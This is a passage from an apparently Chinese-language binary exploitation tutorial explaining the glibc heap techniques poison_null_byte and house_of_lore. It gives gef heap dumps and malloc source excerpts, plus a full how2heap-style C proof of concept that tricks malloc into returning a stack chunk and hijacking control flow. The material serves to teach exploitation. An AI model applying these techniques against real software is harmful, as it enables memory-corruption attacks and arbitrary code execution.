PREV_INUSE) /* Get size, ignoring use bits */ #define chunksize(p) ((p)->size & ~(SIZE_BITS)) \u6240\u4ee5 real_a_size = chunksize(a) - 0x8 == 0x18 \u3002\u53e6\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f\u7a0b\u5e8f\u662f\u901a\u8fc7 next chunk \u7684 PREV_INUSE \u6807\u5fd7\u6765\u5224\u65ad\u67d0 chunk \u662f\u5426\u88ab\u4f7f\u7528\u7684\u3002 \u4e3a\u4e86\u5728\u4fee\u6539 chunk b \u7684 size \u5b57\u6bb5\u540e\uff0c\u4f9d\u7136\u80fd\u901a\u8fc7 unlink \u7684\u68c0\u67e5\uff0c\u6211\u4eec\u9700\u8981\u4f2a\u9020\u4e00\u4e2a c.prev_size \u5b57\u6bb5\uff0c\u5b57\u6bb5\u7684\u5927\u5c0f\u662f\u5f88\u597d\u8ba1\u7b97\u7684\uff0c\u5373 0x100 == (0x111 & 0xff00) \uff0c\u6b63\u597d\u662f NULL \u5b57\u8282\u6ea2\u51fa\u540e\u7684\u503c\u3002\u7136\u540e\u628a chunk b \u91ca\u653e\u6389\uff0cchunk b \u968f\u540e\u88ab\u653e\u5230 unsorted bin \u4e2d\uff0c\u5927\u5c0f\u662f 0x110\u3002\u6b64\u65f6\u7684\u5806\u5e03\u5c40\u5982\u4e0b\uff1a gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000000111 <-- chunk b [be freed] 0x603030: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603040: 0x0000000000000000 0x0000000000000000 0x603050: 0x0000000000000000 0x0000000000000000 0x603060: 0x0000000000000000 0x0000000000000000 0x603070: 0x0000000000000000 0x0000000000000000 0x603080: 0x0000000000000000 0x0000000000000000 0x603090: 0x0000000000000000 0x0000000000000000 0x6030a0: 0x0000000000000000 0x0000000000000000 0x6030b0: 0x0000000000000000 0x0000000000000000 0x6030c0: 0x0000000000000000 0x0000000000000000 0x6030d0: 0x0000000000000000 0x0000000000000000 0x6030e0: 0x0000000000000000 0x0000000000000000 0x6030f0: 0x0000000000000000 0x0000000000000000 0x603100: 0x0000000000000000 0x0000000000000000 0x603110: 0x0000000000000000 0x0000000000000000 0x603120: 0x0000000000000100 0x0000000000000000 <-- fake c.prev_size 0x603130: 0x0000000000000110 0x0000000000000090 <-- chunk c 0x603140: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603020, bk=0x603020 \u2192 Chunk(addr=0x603030, size=0x110, flags=PREV_INUSE) \u6700\u5173\u952e\u7684\u4e00\u6b65\uff0c\u901a\u8fc7\u6ea2\u51fa\u6f0f\u6d1e\u8986\u5199 chunk b \u7684\u6570\u636e\uff1a gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000000100 <-- chunk b [be freed] 0x603030: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603040: 0x0000000000000000 0x0000000000000000 0x603050: 0x0000000000000000 0x0000000000000000 0x603060: 0x0000000000000000 0x0000000000000000 0x603070: 0x0000000000000000 0x0000000000000000 0x603080: 0x0000000000000000 0x0000000000000000 0x603090: 0x0000000000000000 0x0000000000000000 0x6030a0: 0x0000000000000000 0x0000000000000000 0x6030b0: 0x0000000000000000 0x0000000000000000 0x6030c0: 0x0000000000000000 0x0000000000000000 0x6030d0: 0x0000000000000000 0x0000000000000000 0x6030e0: 0x0000000000000000 0x0000000000000000 0x6030f0: 0x0000000000000000 0x0000000000000000 0x603100: 0x0000000000000000 0x0000000000000000 0x603110: 0x0000000000000000 0x0000000000000000 0x603120: 0x0000000000000100 0x0000000000000000 <-- fake c.prev_size 0x603130: 0x0000000000000110 0x0000000000000090 <-- chunk c 0x603140: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603020, bk=0x603020 \u2192 Chunk(addr=0x603030, size=0x100, flags=) \u8fd9\u65f6\uff0c\u6839\u636e\u6211\u4eec\u4e0a\u4e00\u7bc7\u6587\u5b57\u4e2d\u8bb2\u5230\u7684\u8ba1\u7b97\u65b9\u6cd5\uff1a chunksize(P) == *((size_t*)(b-0x8)) & (~ 0x7) == 0x100 prev_size (next_chunk(P)) == *(size_t*)(b-0x10 + 0x100) == 0x100 \u53ef\u4ee5\u6210\u529f\u7ed5\u8fc7\u68c0\u67e5\u3002\u53e6\u5916 unsorted bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e5f\u53d8\u6210\u4e86 0x100\u3002 \u63a5\u4e0b\u6765\u968f\u610f\u5206\u914d\u4e24\u4e2a chunk\uff0cmalloc \u4f1a\u4ece unsorted bin \u4e2d\u5212\u51fa\u5408\u9002\u5927\u5c0f\u7684\u5185\u5b58\u8fd4\u56de\u7ed9\u7528\u6237\uff1a gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000000091 <-- chunk b1 <-- fake chunk b 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x4141414141414141 0x4141414141414141 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000000051 <-- chunk b2 <-- 'victim' chunk 0x6030c0: 0x4141414141414141 0x4141414141414141 0x6030d0: 0x4141414141414141 0x4141414141414141 0x6030e0: 0x4141414141414141 0x4141414141414141 0x6030f0: 0x4141414141414141 0x4141414141414141 0x603100: 0x0000000000000000 0x0000000000000021 <-- unsorted bin 0x603110: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603120: 0x0000000000000020 0x0000000000000000 <-- fake c.prev_size 0x603130: 0x0000000000000110 0x0000000000000090 <-- chunk c 0x603140: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603100, bk=0x603100 \u2192 Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE) \u8fd9\u91cc\u6709\u4e2a\u5f88\u6709\u8da3\u7684\u4e1c\u897f\uff0c\u5206\u914d\u5806\u5757\u540e\uff0c\u53d1\u751f\u53d8\u5316\u7684\u662f fake c.prev_size\uff0c\u800c\u4e0d\u662f c.prev_size\u3002\u6240\u4ee5 chunk c \u4f9d\u7136\u8ba4\u4e3a chunk b \u7684\u5730\u65b9\u6709\u4e00\u4e2a\u5927\u5c0f\u4e3a 0x110 \u7684 free chunk\u3002\u4f46\u5176\u5b9e\u8fd9\u7247\u5185\u5b58\u5df2\u7ecf\u88ab\u5206\u914d\u7ed9\u4e86 chunk b1\u3002 \u63a5\u4e0b\u6765\u662f\u89c1\u8bc1\u5947\u8ff9\u7684\u65f6\u523b\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u4e24\u4e2a\u76f8\u90bb\u7684 small chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u5408\u5e76\u5728\u4e00\u8d77\u3002\u9996\u5148\u91ca\u653e chunk b1\uff0c\u4f2a\u9020\u51fa fake chunk b \u662f free chunk \u7684\u6837\u5b50\u3002\u7136\u540e\u91ca\u653e chunk c\uff0c\u8fd9\u65f6\u7a0b\u5e8f\u4f1a\u53d1\u73b0 chunk c \u7684\u524d\u4e00\u4e2a chunk \u662f\u4e00\u4e2a free chunk\uff0c\u7136\u540e\u5c31\u5c06\u5b83\u4eec\u5408\u5e76\u5728\u4e86\u4e00\u8d77\uff0c\u5e76\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u5408\u5e76\u8fdb\u4e86 top chunk\u3002\u53ef\u601c\u7684 chunk 2 \u4f4d\u4e8e chunk b1 \u548c chunk c \u4e4b\u95f4\uff0c\u88ab\u76f4\u63a5\u65e0\u89c6\u4e86\uff0c\u73b0\u5728 malloc \u8ba4\u4e3a\u8fd9\u6574\u5757\u533a\u57df\u90fd\u662f\u672a\u5206\u914d\u7684\uff0c\u65b0\u7684 top chunk \u6307\u9488\u5df2\u7ecf\u8bf4\u660e\u4e86\u4e00\u5207\u3002 gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000020fe1 <-- top chunk 0x603030: 0x0000000000603100 0x00007ffff7dd1b78 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x4141414141414141 0x4141414141414141 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000090 0x0000000000000050 <-- chunk b2 <-- 'victim' chunk 0x6030c0: 0x4141414141414141 0x4141414141414141 0x6030d0: 0x4141414141414141 0x4141414141414141 0x6030e0: 0x4141414141414141 0x4141414141414141 0x6030f0: 0x4141414141414141 0x4141414141414141 0x603100: 0x0000000000000000 0x0000000000000021 <-- unsorted bin 0x603110: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603120: 0x0000000000000020 0x0000000000000000 0x603130: 0x0000000000000110 0x0000000000000090 0x603140: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603100, bk=0x603100 \u2192 Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE) chunk \u5408\u5e76\u7684\u8fc7\u7a0b\u5982\u4e0b\uff0c\u9996\u5148\u8be5 chunk \u4e0e\u524d\u4e00\u4e2a chunk \u5408\u5e76\uff0c\u7136\u540e\u68c0\u67e5\u4e0b\u4e00\u4e2a chunk \u662f\u5426\u4e3a top chunk\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u56de unsorted bin \u4e2d\uff0c\u5426\u5219\uff0c\u5408\u5e76\u8fdb top chunk\uff1a /* consolidate backward */ if (!prev_inuse(p)) { prevsize = p->prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); } if (nextchunk != av->top) { /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ [...] } /* If the chunk borders the current high end of memory, consolidate into top */ else { size += nextsize; set_head(p, size | PREV_INUSE); av->top = p; check_chunk(av, p); } \u63a5\u4e0b\u6765\uff0c\u7533\u8bf7\u4e00\u5757\u5927\u7a7a\u95f4\uff0c\u5927\u5230\u53ef\u4ee5\u628a chunk b2 \u5305\u542b\u8fdb\u6765\uff0c\u8fd9\u6837 chunk b2 \u5c31\u5b8c\u5168\u88ab\u6211\u4eec\u63a7\u5236\u4e86\u3002 gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000000121 <-- chunk d 0x603030: 0x4242424242424242 0x4242424242424242 0x603040: 0x4242424242424242 0x4242424242424242 0x603050: 0x4242424242424242 0x4242424242424242 0x603060: 0x4242424242424242 0x4242424242424242 0x603070: 0x4242424242424242 0x4242424242424242 0x603080: 0x4242424242424242 0x4242424242424242 0x603090: 0x4242424242424242 0x4242424242424242 0x6030a0: 0x4242424242424242 0x4242424242424242 0x6030b0: 0x4242424242424242 0x4242424242424242 <-- chunk b2 <-- 'victim' chunk 0x6030c0: 0x4242424242424242 0x4242424242424242 0x6030d0: 0x4242424242424242 0x4242424242424242 0x6030e0: 0x4141414141414141 0x4141414141414141 0x6030f0: 0x4141414141414141 0x4141414141414141 0x603100: 0x0000000000000000 0x0000000000000021 <-- small bins 0x603110: 0x00007ffff7dd1b88 0x00007ffff7dd1b88 <-- fd, bk pointer 0x603120: 0x0000000000000020 0x0000000000000000 0x603130: 0x0000000000000110 0x0000000000000090 0x603140: 0x0000000000000000 0x0000000000020ec1 <-- top chunk gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[1]: fw=0x603100, bk=0x603100 \u2192 Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE) \u8fd8\u6709\u4e2a\u4e8b\u60c5\u503c\u5f97\u6ce8\u610f\uff0c\u5728\u5206\u914d chunk d \u65f6\uff0c\u7531\u4e8e\u5728 unsorted bin \u4e2d\u6ca1\u6709\u627e\u5230\u9002\u5408\u7684 chunk\uff0cmalloc \u5c31\u5c06 unsorted bin \u4e2d\u7684 chunk \u90fd\u6574\u7406\u56de\u5404\u81ea\u7684 bins \u4e2d\u4e86\uff0c\u8fd9\u91cc\u5c31\u662f small bins\u3002 \u6700\u540e\uff0c\u7ee7\u7eed\u770b libc-2.26 \u4e0a\u7684\u60c5\u51b5\uff0c\u8fd8\u662f\u4e00\u6837\u7684\uff0c\u5904\u7406\u597d tchache \u5c31\u53ef\u4ee5\u4e86\uff0c\u628a\u4e24\u79cd\u5927\u5c0f\u7684 tcache bin \u90fd\u5360\u6ee1\u3002 heap-buffer-overflow\uff0c\u4f46\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff0c\u52a0\u4e86\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u540e\uff0creal size \u53ea\u80fd\u662f\u6b63\u5e38\u7684 0x10 \u4e86\u3002 $ gcc -fsanitize=address -g poison_null_byte.c $ ./a.out We allocate 0x10 bytes for 'a': 0x60200000eff0 'real' size of 'a': 0x10 b: 0x611000009f00 c: 0x60c00000bf80 ================================================================= ==2369==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000009ef8 at pc 0x000000400be0 bp 0x7ffe7826e9a0 sp 0x7ffe7826e990 READ of size 8 at 0x611000009ef8 thread T0 #0 0x400bdf in main /home/firmy/how2heap/poison_null_byte.c:22 #1 0x7f47d8fe382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #2 0x400978 in _start (/home/firmy/how2heap/a.out+0x400978) 0x611000009ef8 is located 8 bytes to the left of 256-byte region [0x611000009f00,0x61100000a000) allocated by thread T0 here: #0 0x7f47d9425602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602) #1 0x400af1 in main /home/firmy/how2heap/poison_null_byte.c:15 #2 0x7f47d8fe382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)","title":"poison_null_byte"},{"location":"Tutorial/Material/Binary%20Exploitation/#house_of_lore","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> void jackpot(){ puts(\"Nice jump d00d\"); exit(0); } int main() { intptr_t *victim = malloc(0x80); memset(victim, 'A', 0x80); void *p5 = malloc(0x10); memset(p5, 'A', 0x10); intptr_t *victim_chunk = victim - 2; fprintf(stderr, \"Allocated the victim (small) chunk: %p\\n\", victim); intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[3] = {0}; stack_buffer_1[0] = 0; stack_buffer_1[2] = victim_chunk; stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr, \"stack_buffer_1: %p\\n\", (void*)stack_buffer_1); fprintf(stderr, \"stack_buffer_2: %p\\n\\n\", (void*)stack_buffer_2); free((void*)victim); fprintf(stderr, \"Freeing the victim chunk %p, it will be inserted in the unsorted bin\\n\", victim); fprintf(stderr, \"victim->fd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim->bk: %p\\n\\n\", (void *)victim[1]); void *p2 = malloc(0x100); fprintf(stderr, \"Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\\n\", p2); fprintf(stderr, \"The victim chunk %p will be inserted in front of the SmallBin\\n\", victim); fprintf(stderr, \"victim->fd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim->bk: %p\\n\\n\", (void *)victim[1]); victim[1] = (intptr_t)stack_buffer_1; fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim->bk pointer\\n\"); void *p3 = malloc(0x40); char *p4 = malloc(0x80); memset(p4, 'A', 0x10); fprintf(stderr, \"This last malloc should return a chunk at the position injected in bin->bk: %p\\n\", p4); fprintf(stderr, \"The fd pointer of stack_buffer_2 has changed: %p\\n\\n\", stack_buffer_2[2]); intptr_t sc = (intptr_t)jackpot; memcpy((p4+40), &sc, 8); } $ gcc -g house_of_lore.c $ ./a.out Allocated the victim (small) chunk: 0x1b2e010 stack_buffer_1: 0x7ffe5c570350 stack_buffer_2: 0x7ffe5c570330 Freeing the victim chunk 0x1b2e010, it will be inserted in the unsorted bin victim->fd: 0x7f239d4c9b78 victim->bk: 0x7f239d4c9b78 Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x1b2e0c0 The victim chunk 0x1b2e010 will be inserted in front of the SmallBin victim->fd: 0x7f239d4c9bf8 victim->bk: 0x7f239d4c9bf8 Now emulating a vulnerability that can overwrite the victim->bk pointer This last malloc should return a chunk at the position injected in bin->bk: 0x7ffe5c570360 The fd pointer of stack_buffer_2 has changed: 0x7f239d4c9bf8 Nice jump d00d \u5728\u524d\u9762\u7684\u6280\u672f\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u600e\u6837\u53bb\u4f2a\u9020\u4e00\u4e2a fake chunk\uff0c\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u8981\u5c1d\u8bd5\u4f2a\u9020\u4e00\u6761 small bins \u94fe\u3002 \u9996\u5148\u521b\u5efa\u4e24\u4e2a chunk\uff0c\u7b2c\u4e00\u4e2a\u662f\u6211\u4eec\u7684 victim chunk\uff0c\u8bf7\u786e\u4fdd\u5b83\u662f\u4e00\u4e2a small chunk\uff0c\u7b2c\u4e8c\u4e2a\u968f\u610f\uff0c\u53ea\u662f\u4e3a\u4e86\u786e\u4fdd\u5728 free \u65f6 victim chunk \u4e0d\u4f1a\u88ab\u5408\u5e76\u8fdb top chunk \u91cc\u3002\u7136\u540e\uff0c\u5728\u6808\u4e0a\u4f2a\u9020\u4e24\u4e2a fake chunk\uff0c\u8ba9 fake chunk 1 \u7684 fd \u6307\u5411 victim chunk\uff0cbk \u6307\u5411 fake chunk 2\uff1bfake chunk 2 \u7684 fd \u6307\u5411 fake chunk 1\uff0c\u8fd9\u6837\u4e00\u4e2a small bin \u94fe\u5c31\u5dee\u4e0d\u591a\u4e86\uff1a gef\u27a4 x/26gx victim-2 0x603000: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x603010: 0x4141414141414141 0x4141414141414141 0x603020: 0x4141414141414141 0x4141414141414141 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x0000000000000000 0x0000000000000021 <-- chunk p5 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000020f51 <-- top chunk 0x6030c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/10gx &stack_buffer_2 0x7fffffffdc30: 0x0000000000000000 0x0000000000000000 <-- fake chunk 2 0x7fffffffdc40: 0x00007fffffffdc50 0x0000000000400aed <-- fd->fake chunk 1 0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 <-- fake chunk 1 0x7fffffffdc60: 0x0000000000603000 0x00007fffffffdc30 <-- fd->victim chunk, bk->fake chunk 2 0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00 molloc \u4e2d\u5bf9\u4e8e small bin \u94fe\u8868\u7684\u68c0\u67e5\u662f\u8fd9\u6837\u7684\uff1a [...] else { bck = victim->bk; if (__glibc_unlikely (bck->fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } set_inuse_bit_at_offset (victim, nb); bin->bk = bck; bck->fd = bin; [...] \u5373\u68c0\u67e5 bin \u4e2d\u7b2c\u4e8c\u5757\u7684 bk \u6307\u9488\u662f\u5426\u6307\u5411\u7b2c\u4e00\u5757\uff0c\u6765\u53d1\u73b0\u5bf9 small bins \u7684\u7834\u574f\u3002\u4e3a\u4e86\u7ed5\u8fc7\u8fd9\u4e2a\u68c0\u67e5\uff0c\u6240\u4ee5\u624d\u9700\u8981\u540c\u65f6\u4f2a\u9020 bin \u4e2d\u7684\u524d 2 \u4e2a chunk\u3002 \u63a5\u4e0b\u6765\u91ca\u653e\u6389 victim chunk\uff0c\u5b83\u4f1a\u88ab\u653e\u5230 unsoted bin \u4e2d\uff0c\u4e14 fd/bk \u5747\u6307\u5411 unsorted bin \u7684\u5934\u90e8\uff1a gef\u27a4 x/26gx victim-2 0x603000: 0x0000000000000000 0x0000000000000091 <-- victim chunk [be freed] 0x603010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603020: 0x4141414141414141 0x4141414141414141 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x0000000000000090 0x0000000000000020 <-- chunk p5 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000020f51 <-- top chunk 0x6030c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603000, bk=0x603000 \u2192 Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE) \u8fd9\u65f6\uff0c\u7533\u8bf7\u4e00\u5757\u5927\u7684 chunk\uff0c\u53ea\u9700\u8981\u5927\u5230\u8ba9 malloc \u5728 unsorted bin \u4e2d\u627e\u4e0d\u5230\u5408\u9002\u7684\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u6837\u539f\u672c\u5728 unsorted bin \u4e2d\u7684 chunk\uff0c\u4f1a\u88ab\u6574\u7406\u56de\u5404\u81ea\u7684\u6240\u5c5e\u7684 bins \u4e2d\uff0c\u8fd9\u91cc\u5c31\u662f small bins\uff1a gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[8]: fw=0x603000, bk=0x603000 \u2192 Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE) \u63a5\u4e0b\u6765\u662f\u6700\u5173\u952e\u7684\u4e00\u6b65\uff0c\u5047\u8bbe\u5b58\u5728\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u4fee\u6539 victim chunk \u7684 bk \u6307\u9488\u3002\u90a3\u4e48\u5c31\u4fee\u6539 bk \u8ba9\u5b83\u6307\u5411\u6211\u4eec\u5728\u6808\u4e0a\u5e03\u7f6e\u7684 fake small bin\uff1a gef\u27a4 x/26gx victim-2 0x603000: 0x0000000000000000 0x0000000000000091 <-- victim chunk [be freed] 0x603010: 0x00007ffff7dd1bf8 0x00007fffffffdc50 <-- bk->fake chunk 1 0x603020: 0x4141414141414141 0x4141414141414141 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x0000000000000090 0x0000000000000020 <-- chunk p5 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000000111 <-- chunk p2 0x6030c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/10gx &stack_buffer_2 0x7fffffffdc30: 0x0000000000000000 0x0000000000000000 <-- fake chunk 2 0x7fffffffdc40: 0x00007fffffffdc50 0x0000000000400aed <-- fd->fake chunk 1 0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 <-- fake chunk 1 0x7fffffffdc60: 0x0000000000603000 0x00007fffffffdc30 <-- fd->victim chunk, bk->fake chunk 2 0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00 \u6211\u4eec\u77e5\u9053 small bins \u662f\u5148\u8fdb\u540e\u51fa\u7684\uff0c\u8282\u70b9\u7684\u589e\u52a0\u53d1\u751f\u5728\u94fe\u8868\u5934\u90e8\uff0c\u800c\u5220\u9664\u53d1\u751f\u5728\u5c3e\u90e8\u3002\u8fd9\u65f6\u6574\u6761\u94fe\u662f\u8fd9\u6837\u7684\uff1a HEAD(undefined) <-> fake chunk 2 <-> fake chunk 1 <-> victim chunk <-> TAIL fd: -> bk: <- fake chunk 2 \u7684 bk \u6307\u5411\u4e86\u4e00\u4e2a\u672a\u5b9a\u4e49\u7684\u5730\u5740\uff0c\u5982\u679c\u80fd\u901a\u8fc7\u5185\u5b58\u6cc4\u9732\u7b49\u624b\u6bb5\uff0c\u62ff\u5230 HEAD \u7684\u5730\u5740\u5e76\u586b\u8fdb\u53bb\uff0c\u6574\u6761\u94fe\u5c31\u95ed\u5408\u4e86\u3002\u5f53\u7136\u8fd9\u91cc\u5b8c\u5168\u6ca1\u6709\u5fc5\u8981\u8fd9\u4e48\u505a\u3002 \u63a5\u4e0b\u6765\u7684\u7b2c\u4e00\u4e2a malloc\uff0c\u4f1a\u8fd4\u56de victim chunk \u7684\u5730\u5740\uff0c\u5982\u679c malloc \u7684\u5927\u5c0f\u6b63\u597d\u7b49\u4e8e victim chunk \u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u60c5\u51b5\u4f1a\u7b80\u5355\u4e00\u70b9\u3002\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u4e0d\u8fd9\u6837\u505a\uff0cmalloc \u4e00\u4e2a\u5c0f\u4e00\u70b9\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230\uff0cmalloc \u4ece small bin \u91cc\u53d6\u51fa\u4e86\u672b\u5c3e\u7684 victim chunk\uff0c\u5207\u4e86\u4e00\u5757\u8fd4\u56de\u7ed9 chunk p3\uff0c\u7136\u540e\u628a\u5269\u4e0b\u7684\u90e8\u5206\u653e\u56de\u5230\u4e86 unsorted bin\u3002\u540c\u65f6 small bin \u53d8\u6210\u4e86\u8fd9\u6837\uff1a HEAD(undefined) <-> fake chunk 2 <-> fake chunk 1 <-> TAIL gef\u27a4 x/26gx victim-2 0x603000: 0x0000000000000000 0x0000000000000051 <-- chunk p3 0x603010: 0x00007ffff7dd1bf8 0x00007fffffffdc50 0x603020: 0x4141414141414141 0x4141414141414141 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x0000000000000041 <-- unsorted bin 0x603060: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x0000000000000040 0x0000000000000020 <-- chunk p5 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000000111 <-- chunk p2 0x6030c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/10gx &stack_buffer_2 0x7fffffffdc30: 0x0000000000000000 0x0000000000000000 <-- fake chunk 2 0x7fffffffdc40: 0x00007fffffffdc50 0x0000000000400aed <-- fd->fake chunk 1 0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 <-- fake chunk 1 0x7fffffffdc60: 0x00007ffff7dd1bf8 0x00007fffffffdc30 <-- fd->TAIL, bk->fake chunk 2 0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603050, bk=0x603050 \u2192 Chunk(addr=0x603060, size=0x40, flags=PREV_INUSE) \u6700\u540e\uff0c\u518d\u6b21 malloc \u5c06\u8fd4\u56de fake chunk 1 \u7684\u5730\u5740\uff0c\u5730\u5740\u5728\u6808\u4e0a\u4e14\u6211\u4eec\u80fd\u591f\u63a7\u5236\u3002\u540c\u65f6 small bin \u53d8\u6210\u8fd9\u6837\uff1a HEAD(undefined) <-> fake chunk 2 <-> TAIL gef\u27a4 x/10gx &stack_buffer_2 0x7fffffffdc30: 0x0000000000000000 0x0000000000000000 <-- fake chunk 2 0x7fffffffdc40: 0x00007ffff7dd1bf8 0x0000000000400aed <-- fd->TAIL 0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 <-- chunk 4 0x7fffffffdc60: 0x4141414141414141 0x4141414141414141 0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00 \u4e8e\u662f\u6211\u4eec\u5c31\u6210\u529f\u5730\u9a97\u8fc7\u4e86 malloc \u5728\u6808\u4e0a\u5206\u914d\u4e86\u4e00\u4e2a chunk\u3002 \u6700\u540e\u518d\u60f3\u4e00\u4e0b\uff0c\u5176\u5b9e\u6700\u521d\u7684 victim chunk \u4f7f\u7528 